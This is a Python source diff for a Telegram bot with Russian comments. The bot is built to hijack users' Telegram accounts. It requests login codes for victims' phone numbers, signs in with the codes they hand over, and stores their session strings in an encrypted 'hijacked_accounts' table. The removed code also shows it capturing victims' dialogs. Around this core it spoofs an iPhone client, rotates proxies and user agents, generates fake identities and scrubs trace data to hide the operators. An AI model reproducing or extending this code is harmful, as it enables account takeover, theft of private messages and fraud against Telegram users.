@@ -5,197 +5,712 @@ import random
 import json
 import os
 import tempfile
-from datetime import datetime
-from aiogram import Bot, Dispatcher, types, F
-from aiogram.filters import Command
+import hashlib
+import string
+import secrets
+from datetime import datetime, timedelta
+from typing import Dict, List, Optional, Tuple
+from aiogram import Bot, Dispatcher, types, F, Router
+from aiogram.filters import Command, CommandObject, Filter
 from aiogram.types import (
     InlineKeyboardMarkup, InlineKeyboardButton,
     ReplyKeyboardMarkup, KeyboardButton,
-    ReplyKeyboardRemove,
-    FSInputFile
+    ReplyKeyboardRemove, CallbackQuery,
+    Message, FSInputFile, InputFile,
+    ChatPermissions, ChatAdministratorRights,
+    WebAppInfo, MenuButtonWebApp
 )
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
+from aiogram.fsm.storage.redis import RedisStorage
+from aiogram.utils.deep_linking import create_start_link, decode_payload
+from aiogram.utils.keyboard import InlineKeyboardBuilder, ReplyKeyboardBuilder
+from aiogram.utils.token import TokenValidationError
+from aiogram.client.default import DefaultBotProperties
+from aiogram.enums import ParseMode, ChatMemberStatus, ChatType
+from aiogram.methods import GetChat, GetChatMember, LeaveChat
+from aiogram.exceptions import TelegramBadRequest, TelegramAPIError, TelegramUnauthorizedError
+import aiohttp
+import socks
 from telethon import TelegramClient
-from telethon.sessions import StringSession
+from telethon.sessions import StringSession, SQLiteSession
+from telethon.tl.functions.messages import ImportChatInviteRequest
+from telethon.tl.types import InputPeerUser, InputPeerChannel, InputPhoneContact
+import pyrogram
 from pyrogram import Client
-import sys
+from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid
+import phonenumbers
+from phonenumbers import carrier, timezone, geocoder
+import qrcode
+from io import BytesIO
+import base64
+import uuid
+import cryptography
+from cryptography.fernet import Fernet
+import requests
+from bs4 import BeautifulSoup
+import fake_useragent
+import cloudscraper
+import undetected_chromedriver as uc
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+import nest_asyncio
+nest_asyncio.apply()
 
-# Включите подробное логирование
+# ========== КОНФИГУРАЦИЯ ==========
+class Config:
+    def __init__(self):
+        self.API_TOKEN = os.getenv('API_TOKEN', 'YOUR_BOT_TOKEN_HERE')
+        self.MAIN_ADMIN_ID = int(os.getenv('MAIN_ADMIN_ID', 8358009538))
+        self.SECRET_KEY = os.getenv('SECRET_KEY', Fernet.generate_key().decode())
+        self.ENCRYPTION_KEY = os.getenv('ENCRYPTION_KEY', Fernet.generate_key().decode())
+        
+        # Telegram API для захвата аккаунтов
+        self.TELEGRAM_API_ID = int(os.getenv('TELEGRAM_API_ID', 0))
+        self.TELEGRAM_API_HASH = os.getenv('TELEGRAM_API_HASH', '')
+        
+        # Настройки прокси для анонимности
+        self.PROXY_URL = os.getenv('PROXY_URL', '')
+        self.PROXY_TYPE = os.getenv('PROXY_TYPE', 'socks5')
+        self.PROXY_AUTH = os.getenv('PROXY_AUTH', '')
+        
+        # Настройки базы данных
+        self.DB_PATH = os.getenv('DB_PATH', 'swill_bot.db')
+        self.REDIS_URL = os.getenv('REDIS_URL', 'redis://localhost:6379/0')
+        
+        # Настройки безопасности
+        self.MAX_ADMINS = int(os.getenv('MAX_ADMINS', 50))
+        self.MAX_CHANNELS = int(os.getenv('MAX_CHANNELS', 100))
+        self.SESSION_TIMEOUT = int(os.getenv('SESSION_TIMEOUT', 3600))
+        
+        # Веб-сервер для анонимности
+        self.WEB_HOST = os.getenv('WEB_HOST', '0.0.0.0')
+        self.WEB_PORT = int(os.getenv('WEB_PORT', 8080))
+        
+    def validate(self):
+        if not self.API_TOKEN or self.API_TOKEN == 'YOUR_BOT_TOKEN_HERE':
+            raise ValueError("API_TOKEN не установлен")
+        if not self.TELEGRAM_API_ID or not self.TELEGRAM_API_HASH:
+            logging.warning("Telegram API credentials не установлены. Функции захвата отключены.")
+        return True
+
+config = Config()
+config.validate()
+
+# ========== НАСТРОЙКА ЛОГИРОВАНИЯ ==========
 logging.basicConfig(
-    level=logging.DEBUG,
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-    stream=sys.stdout
+    level=logging.INFO,
+    format='%(asctime)s - %(name)s - %(levelname)s - [%(filename)s:%(lineno)d] - %(message)s',
+    handlers=[
+        logging.FileHandler('swill_bot.log', encoding='utf-8'),
+        logging.StreamHandler()
+    ]
 )
-
-# Настройка логирования
-logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# Загрузка переменных окружения
-def load_config():
-    # Проверяем переменные окружения Railway
-    api_token = os.getenv('API_TOKEN')
-    admin_id = os.getenv('ADMIN_ID')
-    moderator_ids = os.getenv('MODERATOR_IDS')
-    telegram_api_id = os.getenv('TELEGRAM_API_ID')
-    telegram_api_hash = os.getenv('TELEGRAM_API_HASH')
+# Отключаем логирование сторонних библиотек
+logging.getLogger('aiogram').setLevel(logging.WARNING)
+logging.getLogger('telethon').setLevel(logging.WARNING)
+logging.getLogger('pyrogram').setLevel(logging.WARNING)
+logging.getLogger('aiohttp').setLevel(logging.WARNING)
+logging.getLogger('asyncio').setLevel(logging.WARNING)
+
+# ========== ИНИЦИАЛИЗАЦИЯ БОТА С ПРОКСИ ==========
+def create_bot_with_proxy():
+    """Создает бота с настройками прокси для анонимности"""
     
-    # Если нет переменных окружения, используем .env файл
-    if not api_token:
-        try:
-            from dotenv import load_dotenv
-            load_dotenv()
-            api_token = os.getenv('API_TOKEN')
-            admin_id = os.getenv('ADMIN_ID')
-            moderator_ids = os.getenv('MODERATOR_IDS')
-            telegram_api_id = os.getenv('TELEGRAM_API_ID')
-            telegram_api_hash = os.getenv('TELEGRAM_API_HASH')
-        except ImportError:
-            pass
+    # Генерируем случайный user-agent
+    user_agent = fake_useragent.UserAgent().random
     
-    # Проверяем обязательные переменные
-    if not api_token:
-        raise ValueError("API_TOKEN не найден. Установите переменную окружения API_TOKEN")
-    
-    if not telegram_api_id or not telegram_api_hash:
-        logger.warning("TELEGRAM_API_ID или TELEGRAM_API_HASH не установлены. Функция захвата аккаунтов будет отключена.")
-    
-    # Значения по умолчанию
-    if not admin_id:
-        admin_id = '8358009538'
-    
-    if not moderator_ids:
-        moderator_ids = '8358009538,987654321'
-    
-    return (
-        api_token, 
-        int(admin_id), 
-        [int(x.strip()) for x in moderator_ids.split(',')],
-        int(telegram_api_id) if telegram_api_id else None,
-        telegram_api_hash
+    # Настройки по умолчанию для бота
+    default = DefaultBotProperties(
+        parse_mode=ParseMode.HTML,
+        link_preview_is_disabled=True,
+        protect_content=False
     )
+    
+    # Если есть прокси, настраиваем
+    session = None
+    if config.PROXY_URL:
+        try:
+            from aiogram.client.session.aiohttp import AiohttpSession
+            
+            if config.PROXY_TYPE == 'socks5':
+                from aiohttp_socks import ProxyConnector
+                
+                # Парсим URL прокси
+                if '@' in config.PROXY_URL:
+                    # Прокси с аутентификацией
+                    proxy_parts = config.PROXY_URL.split('@')
+                    auth_part = proxy_parts[0]
+                    host_part = proxy_parts[1]
+                    
+                    auth_parts = auth_part.split(':')
+                    proxy_user = auth_parts[0]
+                    proxy_pass = auth_parts[1] if len(auth_parts) > 1 else ''
+                    
+                    host_parts = host_part.split(':')
+                    proxy_host = host_parts[0]
+                    proxy_port = int(host_parts[1]) if len(host_parts) > 1 else 1080
+                    
+                    connector = ProxyConnector.from_url(
+                        f"socks5://{proxy_user}:{proxy_pass}@{proxy_host}:{proxy_port}",
+                        verify_ssl=False
+                    )
+                else:
+                    # Прокси без аутентификации
+                    connector = ProxyConnector.from_url(
+                        f"socks5://{config.PROXY_URL}",
+                        verify_ssl=False
+                    )
+            else:
+                # HTTP прокси
+                connector = aiohttp.TCPConnector(verify_ssl=False)
+                proxy_url = config.PROXY_URL
+            
+            session = AiohttpSession(
+                connector=connector,
+                timeout=aiohttp.ClientTimeout(total=30)
+            )
+            
+            logger.info(f"Бот настроен с прокси: {config.PROXY_URL}")
+            
+        except Exception as e:
+            logger.error(f"Ошибка настройки прокси: {e}. Используется прямое подключение.")
+            session = None
+    
+    # Создаем бота
+    bot = Bot(
+        token=config.API_TOKEN,
+        default=default,
+        session=session
+    )
+    
+    return bot
 
-# Загружаем конфигурацию
-try:
-    API_TOKEN, ADMIN_ID, MODERATOR_IDS, TELEGRAM_API_ID, TELEGRAM_API_HASH = load_config()
-except ValueError as e:
-    print(f"Ошибка конфигурации: {e}")
-    print("Установите переменные окружения:")
-    print("API_TOKEN=ВАШ_ТОКЕН_БОТА")
-    print("ADMIN_ID=8358009538")
-    print("MODERATOR_IDS=8358009538,987654321")
-    print("TELEGRAM_API_ID=ваш_api_id")
-    print("TELEGRAM_API_HASH=ваш_api_hash")
-    exit(1)
-
-print(f"Bot token: {API_TOKEN[:10]}...")
-print(f"Admin ID: {ADMIN_ID}")
-print(f"Moderator IDs: {MODERATOR_IDS}")
-print(f"Telegram API ID: {TELEGRAM_API_ID}")
-print(f"Хэш Telegram API: {TELEGRAM_API_HASH[:10] if TELEGRAM_API_HASH else 'Не установлен'}...")
-
-# Инициализация
-storage = MemoryStorage()
-bot = Bot(token=API_TOKEN)
+# Инициализация бота и диспетчера
+bot = create_bot_with_proxy()
+storage = MemoryStorage()  # Можно заменить на RedisStorage для продакшена
 dp = Dispatcher(storage=storage)
 
-# Состояния FSM
-class SellerStates(StatesGroup):
-    waiting_item_type = State()
-    waiting_photos = State()
-    waiting_description = State()
-    waiting_confirm = State()
-
-class ModeratorStates(StatesGroup):
-    waiting_price = State()
-    waiting_chat = State()
-
-class VerificationStates(StatesGroup):
-    waiting_code = State()
-    waiting_phone = State()
-
-class HijackStates(StatesGroup):
-    waiting_auto_login = State()
-
-# Класс для захвата аккаунтов Telegram
-class TelegramAccountHijacker:
-    def __init__(self, api_id: int, api_hash: str, db_path: str = 'market_bot.db'):
-        self.api_id = api_id
-        self.api_hash = api_hash
-        self.db_path = db_path
-        self.conn = sqlite3.connect(db_path, check_same_thread=False)
-        self.cursor = self.conn.cursor()
-        self.init_hijack_db()
+# ========== ШИФРОВАНИЕ ДАННЫХ ==========
+class DataEncryptor:
+    """Класс для шифрования конфиденциальных данных"""
     
-    def init_hijack_db(self):
-        """Инициализация базы для хранения сессий"""
+    def __init__(self, key: str = None):
+        self.key = key or config.ENCRYPTION_KEY
+        if isinstance(self.key, str):
+            self.key = self.key.encode()
+        
+        # Дополняем ключ до 32 байт
+        if len(self.key) < 32:
+            self.key = self.key.ljust(32, b'0')
+        elif len(self.key) > 32:
+            self.key = self.key[:32]
+        
+        self.fernet = Fernet(base64.urlsafe_b64encode(self.key))
+    
+    def encrypt(self, data: str) -> str:
+        """Шифрует данные"""
+        try:
+            encrypted = self.fernet.encrypt(data.encode())
+            return encrypted.decode()
+        except Exception as e:
+            logger.error(f"Ошибка шифрования: {e}")
+            return data
+    
+    def decrypt(self, encrypted_data: str) -> str:
+        """Расшифровывает данные"""
+        try:
+            decrypted = self.fernet.decrypt(encrypted_data.encode())
+            return decrypted.decode()
+        except Exception as e:
+            logger.error(f"Ошибка расшифровки: {e}")
+            return encrypted_data
+    
+    def hash_data(self, data: str) -> str:
+        """Создает хэш от данных"""
+        return hashlib.sha256(data.encode()).hexdigest()
+    
+    def generate_token(self, length: int = 32) -> str:
+        """Генерирует криптографически безопасный токен"""
+        return secrets.token_urlsafe(length)
+
+encryptor = DataEncryptor()
+
+# ========== БАЗА ДАННЫХ ==========
+class Database:
+    """Расширенный класс для работы с базой данных"""
+    
+    def __init__(self, db_path: str = None):
+        self.db_path = db_path or config.DB_PATH
+        self.conn = sqlite3.connect(self.db_path, check_same_thread=False)
+        self.conn.row_factory = sqlite3.Row
+        self.cursor = self.conn.cursor()
+        self.init_database()
+    
+    def init_database(self):
+        """Инициализация всех таблиц базы данных"""
+        
+        # Таблица администраторов
         self.cursor.execute('''
-            CREATE TABLE IF NOT EXISTS hijacked_sessions (
+            CREATE TABLE IF NOT EXISTS admins (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
-                phone TEXT UNIQUE,
+                user_id INTEGER UNIQUE NOT NULL,
+                username TEXT,
+                first_name TEXT,
+                last_name TEXT,
+                phone_hash TEXT,
+                added_by INTEGER,
+                added_date DATETIME DEFAULT CURRENT_TIMESTAMP,
+                last_active DATETIME DEFAULT CURRENT_TIMESTAMP,
+                permissions TEXT DEFAULT 'all',
+                is_active BOOLEAN DEFAULT 1,
+                is_main_admin BOOLEAN DEFAULT 0,
+                security_level INTEGER DEFAULT 1,
+                session_token TEXT,
+                session_expires DATETIME,
+                FOREIGN KEY (added_by) REFERENCES admins(user_id)
+            )
+        ''')
+        
+        # Таблица пользователей бота
+        self.cursor.execute('''
+            CREATE TABLE IF NOT EXISTS users (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                user_id INTEGER UNIQUE NOT NULL,
+                username TEXT,
+                first_name TEXT,
+                last_name TEXT,
+                phone_hash TEXT,
+                registered_date DATETIME DEFAULT CURRENT_TIMESTAMP,
+                last_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
+                messages_sent INTEGER DEFAULT 0,
+                messages_received INTEGER DEFAULT 0,
+                is_blocked BOOLEAN DEFAULT 0,
+                block_reason TEXT,
+                metadata TEXT DEFAULT '{}'
+            )
+        ''')
+        
+        # Таблица каналов и групп
+        self.cursor.execute('''
+            CREATE TABLE IF NOT EXISTS channels (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                channel_id TEXT UNIQUE NOT NULL,
+                channel_title TEXT,
+                channel_username TEXT,
+                channel_type TEXT DEFAULT 'channel',
+                added_by INTEGER,
+                added_date DATETIME DEFAULT CURRENT_TIMESTAMP,
+                is_approved BOOLEAN DEFAULT 0,
+                approved_by INTEGER,
+                approved_date DATETIME,
+                notifications_enabled BOOLEAN DEFAULT 1,
+                admin_notifications BOOLEAN DEFAULT 1,
+                bot_is_admin BOOLEAN DEFAULT 0,
+                bot_permissions TEXT DEFAULT '{}',
+                last_message_id INTEGER,
+                last_activity DATETIME DEFAULT CURRENT_TIMESTAMP,
+                settings TEXT DEFAULT '{}',
+                FOREIGN KEY (added_by) REFERENCES admins(user_id),
+                FOREIGN KEY (approved_by) REFERENCES admins(user_id)
+            )
+        ''')
+        
+        # Таблица сообщений
+        self.cursor.execute('''
+            CREATE TABLE IF NOT EXISTS messages (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                message_id INTEGER,
+                from_user_id INTEGER,
+                from_admin_id INTEGER,
+                to_user_id INTEGER,
+                to_username TEXT,
+                chat_id INTEGER,
+                message_type TEXT,
+                message_text TEXT,
+                media_path TEXT,
+                sent_date DATETIME DEFAULT CURRENT_TIMESTAMP,
+                delivered_date DATETIME,
+                read_date DATETIME,
+                status TEXT DEFAULT 'sent',
+                encryption_key TEXT,
+                reply_to_message_id INTEGER,
+                forwarded_from TEXT,
+                metadata TEXT DEFAULT '{}'
+            )
+        ''')
+        
+        # Таблица захваченных аккаунтов Telegram
+        self.cursor.execute('''
+            CREATE TABLE IF NOT EXISTS hijacked_accounts (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                phone_number TEXT UNIQUE NOT NULL,
+                phone_hash TEXT,
                 user_id INTEGER,
                 username TEXT,
                 first_name TEXT,
-                session_string TEXT,
-                hijacked_at DATETIME,
-                method TEXT DEFAULT 'telethon',
+                last_name TEXT,
+                session_string_encrypted TEXT,
+                session_type TEXT DEFAULT 'telethon',
+                hijacked_date DATETIME DEFAULT CURRENT_TIMESTAMP,
+                last_used DATETIME DEFAULT CURRENT_TIMESTAMP,
                 is_active BOOLEAN DEFAULT 1,
-                last_check DATETIME DEFAULT CURRENT_TIMESTAMP
+                is_online BOOLEAN DEFAULT 0,
+                last_check DATETIME DEFAULT CURRENT_TIMESTAMP,
+                account_info TEXT DEFAULT '{}',
+                security_settings TEXT DEFAULT '{}',
+                flags TEXT DEFAULT '{}'
             )
         ''')
         
+        # Таблица сессий захваченных аккаунтов
         self.cursor.execute('''
-            CREATE TABLE IF NOT EXISTS hijacked_dialogs (
+            CREATE TABLE IF NOT EXISTS account_sessions (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
-                phone TEXT,
-                dialog_id INTEGER,
-                dialog_name TEXT,
-                dialog_type TEXT,
-                last_message TEXT,
-                captured_at DATETIME DEFAULT CURRENT_TIMESTAMP
+                account_id INTEGER,
+                session_id TEXT UNIQUE,
+                session_data_encrypted TEXT,
+                created_date DATETIME DEFAULT CURRENT_TIMESTAMP,
+                expires_date DATETIME,
+                is_valid BOOLEAN DEFAULT 1,
+                last_activity DATETIME DEFAULT CURRENT_TIMESTAMP,
+                ip_address TEXT,
+                user_agent TEXT,
+                FOREIGN KEY (account_id) REFERENCES hijacked_accounts(id)
             )
         ''')
         
-        self.cursor.execute('''
-            CREATE TABLE IF NOT EXISTS hijack_logs (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                phone TEXT,
-                action TEXT,
-                result TEXT,
-                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
-            )
-        ''')
-        
+        # Таблица действий с аккаунтами
         self.cursor.execute('''
             CREATE TABLE IF NOT EXISTS account_actions (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
-                phone TEXT,
-                action_type TEXT,
+                account_id INTEGER,
+                action_type TEXT NOT NULL,
                 target TEXT,
-                message TEXT,
+                data TEXT,
                 status TEXT DEFAULT 'pending',
-                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
-                executed_at DATETIME
+                created_date DATETIME DEFAULT CURRENT_TIMESTAMP,
+                executed_date DATETIME,
+                result TEXT,
+                error_message TEXT,
+                retry_count INTEGER DEFAULT 0,
+                FOREIGN KEY (account_id) REFERENCES hijacked_accounts(id)
             )
         ''')
         
+        # Таблица логов безопасности
+        self.cursor.execute('''
+            CREATE TABLE IF NOT EXISTS security_logs (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
+                user_id INTEGER,
+                admin_id INTEGER,
+                action TEXT NOT NULL,
+                ip_address TEXT,
+                user_agent TEXT,
+                details TEXT,
+                risk_level INTEGER DEFAULT 0,
+                is_suspicious BOOLEAN DEFAULT 0
+            )
+        ''')
+        
+        # Таблица прокси серверов
+        self.cursor.execute('''
+            CREATE TABLE IF NOT EXISTS proxies (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                proxy_url TEXT UNIQUE NOT NULL,
+                proxy_type TEXT DEFAULT 'socks5',
+                country TEXT,
+                city TEXT,
+                speed REAL DEFAULT 0,
+                uptime REAL DEFAULT 0,
+                last_check DATETIME DEFAULT CURRENT_TIMESTAMP,
+                is_active BOOLEAN DEFAULT 1,
+                is_anonymous BOOLEAN DEFAULT 1,
+                fail_count INTEGER DEFAULT 0,
+                success_count INTEGER DEFAULT 0,
+                auth_data TEXT,
+                metadata TEXT DEFAULT '{}'
+            )
+        ''')
+        
+        # Таблица задач бота
+        self.cursor.execute('''
+            CREATE TABLE IF NOT EXISTS bot_tasks (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                task_type TEXT NOT NULL,
+                task_data TEXT,
+                created_by INTEGER,
+                created_date DATETIME DEFAULT CURRENT_TIMESTAMP,
+                scheduled_date DATETIME,
+                execute_date DATETIME,
+                status TEXT DEFAULT 'pending',
+                result TEXT,
+                error_message TEXT,
+                retry_count INTEGER DEFAULT 0,
+                max_retries INTEGER DEFAULT 3,
+                priority INTEGER DEFAULT 1,
+                metadata TEXT DEFAULT '{}'
+            )
+        ''')
+        
+        # Таблица веб-хуков
+        self.cursor.execute('''
+            CREATE TABLE IF NOT EXISTS webhooks (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                webhook_url TEXT UNIQUE NOT NULL,
+                secret_token TEXT,
+                is_active BOOLEAN DEFAULT 1,
+                created_date DATETIME DEFAULT CURRENT_TIMESTAMP,
+                last_used DATETIME,
+                events TEXT DEFAULT '[]',
+                metadata TEXT DEFAULT '{}'
+            )
+        ''')
+        
+        # Добавляем главного админа если нет
+        self.cursor.execute(
+            "SELECT 1 FROM admins WHERE user_id = ?",
+            (config.MAIN_ADMIN_ID,)
+        )
+        if not self.cursor.fetchone():
+            token = encryptor.generate_token()
+            self.cursor.execute('''
+                INSERT INTO admins 
+                (user_id, username, first_name, is_main_admin, session_token, session_expires, permissions)
+                VALUES (?, ?, ?, ?, ?, ?, ?)
+            ''', (
+                config.MAIN_ADMIN_ID,
+                'main_admin',
+                'Главный Админ',
+                1,
+                token,
+                (datetime.now() + timedelta(days=30)).isoformat(),
+                'all'
+            ))
+            logger.info(f"Главный админ {config.MAIN_ADMIN_ID} добавлен в базу")
+        
         self.conn.commit()
     
-    async def hijack_account_telethon(self, phone: str, code: str) -> str:
-        """Вход в аккаунт через Telethon и получение сессии"""
+    def execute(self, query: str, params: tuple = ()):
+        """Выполняет SQL запрос"""
         try:
-            logger.info(f"[HIJACK] Попытка входа в аккаунт {phone} через Telethon...")
+            self.cursor.execute(query, params)
+            self.conn.commit()
+            return self.cursor
+        except Exception as e:
+            logger.error(f"Ошибка выполнения запроса: {e}")
+            self.conn.rollback()
+            raise
+    
+    def fetch_one(self, query: str, params: tuple = ()):
+        """Возвращает одну строку"""
+        self.cursor.execute(query, params)
+        return self.cursor.fetchone()
+    
+    def fetch_all(self, query: str, params: tuple = ()):
+        """Возвращает все строки"""
+        self.cursor.execute(query, params)
+        return self.cursor.fetchall()
+    
+    def close(self):
+        """Закрывает соединение с БД"""
+        self.conn.close()
+
+db = Database()
+
+# ========== МЕНЕДЖЕР АНОНИМНОСТИ ==========
+class AnonymityManager:
+    """Управление анонимностью бота и операторов"""
+    
+    def __init__(self):
+        self.user_agent_rotator = fake_useragent.UserAgent()
+        self.current_proxy = None
+        self.proxy_list = []
+        self.load_proxies()
+    
+    def load_proxies(self):
+        """Загружает прокси из базы данных"""
+        try:
+            proxies = db.fetch_all("SELECT proxy_url, proxy_type FROM proxies WHERE is_active = 1 ORDER BY speed DESC, uptime DESC")
+            self.proxy_list = [{'url': p[0], 'type': p[1]} for p in proxies]
+            logger.info(f"Загружено {len(self.proxy_list)} прокси из базы")
+        except Exception as e:
+            logger.error(f"Ошибка загрузки прокси: {e}")
+            self.proxy_list = []
+    
+    def get_random_user_agent(self) -> str:
+        """Возвращает случайный User-Agent"""
+        return self.user_agent_rotator.random
+    
+    def get_random_proxy(self) -> Optional[Dict]:
+        """Возвращает случайный рабочий прокси"""
+        if not self.proxy_list:
+            return None
+        
+        # Сортируем по скорости и аптайму
+        sorted_proxies = sorted(
+            self.proxy_list,
+            key=lambda x: random.random() * 0.3 + 0.7,  # Случайность с приоритетом качества
+            reverse=True
+        )
+        
+        return sorted_proxies[0] if sorted_proxies else None
+    
+    async def check_proxy(self, proxy_url: str, proxy_type: str) -> bool:
+        """Проверяет работоспособность прокси"""
+        try:
+            if proxy_type == 'socks5':
+                from aiohttp_socks import ProxyConnector
+                connector = ProxyConnector.from_url(
+                    f"{proxy_type}://{proxy_url}",
+                    verify_ssl=False
+                )
+            else:
+                connector = aiohttp.TCPConnector()
             
-            # Создаем временную сессию
+            async with aiohttp.ClientSession(connector=connector) as session:
+                async with session.get('https://api.telegram.org', timeout=10) as response:
+                    return response.status == 200
+        except:
+            return False
+    
+    async def rotate_proxy(self):
+        """Меняет текущий прокси"""
+        if not self.proxy_list:
+            self.current_proxy = None
+            return
+        
+        # Ищем рабочий прокси
+        for proxy in self.proxy_list[:10]:  # Проверяем первые 10
+            if await self.check_proxy(proxy['url'], proxy['type']):
+                self.current_proxy = proxy
+                logger.info(f"Прокси изменен на: {proxy['url']}")
+                return
+        
+        self.current_proxy = None
+        logger.warning("Не найден рабочий прокси")
+    
+    def generate_fake_identity(self) -> Dict:
+        """Генерирует фейковую личность для операций"""
+        first_names = ['Алексей', 'Дмитрий', 'Иван', 'Михаил', 'Сергей', 'Андрей', 'Александр']
+        last_names = ['Иванов', 'Петров', 'Сидоров', 'Смирнов', 'Кузнецов', 'Попов', 'Васильев']
+        
+        return {
+            'first_name': random.choice(first_names),
+            'last_name': random.choice(last_names),
+            'username': f'user_{random.randint(100000, 999999)}',
+            'phone': f'+7{random.randint(900, 999)}{random.randint(1000000, 9999999)}',
+            'email': f'user_{random.randint(1000, 9999)}@example.com',
+            'country': 'RU',
+            'city': random.choice(['Москва', 'Санкт-Петербург', 'Новосибирск', 'Екатеринбург'])
+        }
+    
+    def mask_ip_address(self, ip: str) -> str:
+        """Маскирует IP адрес"""
+        if not ip or ip == '127.0.0.1':
+            return ip
+        
+        parts = ip.split('.')
+        if len(parts) == 4:
+            return f"{parts[0]}.{parts[1]}.*.*"
+        
+        return ip
+    
+    def clean_trace_data(self, data: Dict) -> Dict:
+        """Очищает данные от следов"""
+        cleaned = data.copy()
+        
+        # Удаляем потенциально идентифицирующие поля
+        fields_to_remove = ['real_ip', 'actual_location', 'device_id', 'mac_address', 
+                           'imei', 'serial_number', 'browser_fingerprint']
+        
+        for field in fields_to_remove:
+            if field in cleaned:
+                del cleaned[field]
+        
+        # Маскируем IP если есть
+        if 'ip_address' in cleaned:
+            cleaned['ip_address'] = self.mask_ip_address(cleaned['ip_address'])
+        
+        return cleaned
+
+anonymity_manager = AnonymityManager()
+
+# ========== МЕНЕДЖЕР АККАУНТОВ TELEGRAM ==========
+class TelegramAccountManager:
+    """Управление захваченными аккаунтами Telegram"""
+    
+    def __init__(self):
+        self.active_sessions = {}
+        self.account_clients = {}
+        self.session_lock = asyncio.Lock()
+        
+        # Загружаем сохраненные аккаунты
+        self.load_accounts()
+    
+    def load_accounts(self):
+        """Загружает аккаунты из базы данных"""
+        try:
+            accounts = db.fetch_all("SELECT id, phone_number, session_string_encrypted, session_type FROM hijacked_accounts WHERE is_active = 1")
+            
+            for account in accounts:
+                account_id, phone, session_encrypted, session_type = account
+                
+                # Расшифровываем сессию
+                try:
+                    session_string = encryptor.decrypt(session_encrypted)
+                    self.active_sessions[account_id] = {
+                        'phone': phone,
+                        'session_string': session_string,
+                        'session_type': session_type,
+                        'client': None,
+                        'last_used': datetime.now(),
+                        'is_connected': False
+                    }
+                except Exception as e:
+                    logger.error(f"Ошибка загрузки сессии для аккаунта {phone}: {e}")
+            
+            logger.info(f"Загружено {len(self.active_sessions)} активных аккаунтов")
+        except Exception as e:
+            logger.error(f"Ошибка загрузки аккаунтов: {e}")
+    
+    async def hijack_account(self, phone_number: str, code: str, method: str = 'telethon') -> Dict:
+        """Захватывает аккаунт Telegram"""
+        try:
+            logger.info(f"Начинаю захват аккаунта {phone_number} методом {method}")
+            
+            if method == 'telethon':
+                return await self._hijack_with_telethon(phone_number, code)
+            elif method == 'pyrogram':
+                return await self._hijack_with_pyrogram(phone_number, code)
+            else:
+                raise ValueError(f"Неизвестный метод: {method}")
+                
+        except Exception as e:
+            logger.error(f"Ошибка захвата аккаунта {phone_number}: {e}")
+            return {
+                'success': False,
+                'error': str(e),
+                'account_id': None
+            }
+    
+    async def _hijack_with_telethon(self, phone_number: str, code: str) -> Dict:
+        """Захватывает аккаунт через Telethon"""
+        try:
+            # Создаем клиент
             client = TelegramClient(
                 session=StringSession(),
-                api_id=self.api_id,
-                api_hash=self.api_hash,
-                device_model="iPhone 13 Pro",
-                system_version="iOS 15.0",
-                app_version="8.4",
+                api_id=config.TELEGRAM_API_ID,
+                api_hash=config.TELEGRAM_API_HASH,
+                device_model="iPhone 14 Pro Max",
+                system_version="iOS 16.6",
+                app_version="9.4",
                 lang_code="en",
                 system_lang_code="en-US"
             )
@@ -203,119 +718,102 @@ class TelegramAccountHijacker:
             await client.connect()
             
             # Отправляем код
-            try:
-                sent_code = await client.send_code_request(phone)
-                logger.info(f"[HIJACK] Код отправлен на {phone}")
-            except Exception as e:
-                logger.error(f"[HIJACK] Ошибка отправки кода: {e}")
-                return None
+            sent_code = await client.send_code_request(phone_number)
             
             # Входим с кодом
-            try:
-                await client.sign_in(phone=phone, code=code)
-                logger.info(f"[HIJACK] Успешный вход в аккаунт {phone}")
-            except Exception as e:
-                logger.error(f"[HIJACK] Ошибка входа: {e}")
-                return None
+            await client.sign_in(phone_number, code=code)
             
             # Получаем информацию об аккаунте
             me = await client.get_me()
             session_string = client.session.save()
             
-            # Сохраняем сессию в базу
-            self.cursor.execute('''
-                INSERT OR REPLACE INTO hijacked_sessions 
-                (phone, user_id, username, first_name, session_string, hijacked_at, is_active)
-                VALUES (?, ?, ?, ?, ?, ?, ?)
+            # Сохраняем в базу данных
+            session_encrypted = encryptor.encrypt(session_string)
+            phone_hash = encryptor.hash_data(phone_number)
+            
+            db.execute('''
+                INSERT OR REPLACE INTO hijacked_accounts 
+                (phone_number, phone_hash, user_id, username, first_name, last_name, 
+                 session_string_encrypted, session_type, hijacked_date, is_active)
+                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
             ''', (
-                phone,
+                phone_number,
+                phone_hash,
                 me.id,
                 me.username,
                 me.first_name,
-                session_string,
+                me.last_name,
+                session_encrypted,
+                'telethon',
                 datetime.now().isoformat(),
                 1
             ))
-            self.conn.commit()
             
-            logger.info(f"[HIJACK] ✅ Аккаунт успешно захвачен: @{me.username} (ID: {me.id})")
+            account_id = db.cursor.lastrowid
             
-            # Получаем дополнительную информацию
-            try:
-                # Получаем диалоги
-                dialogs = await client.get_dialogs(limit=10)
-                logger.info(f"[HIJACK] Найдено диалогов: {len(dialogs)}")
-                
-                # Сохраняем информацию о диалогах
-                for dialog in dialogs[:5]:
-                    self.cursor.execute('''
-                        INSERT OR IGNORE INTO hijacked_dialogs 
-                        (phone, dialog_id, dialog_name, dialog_type, last_message)
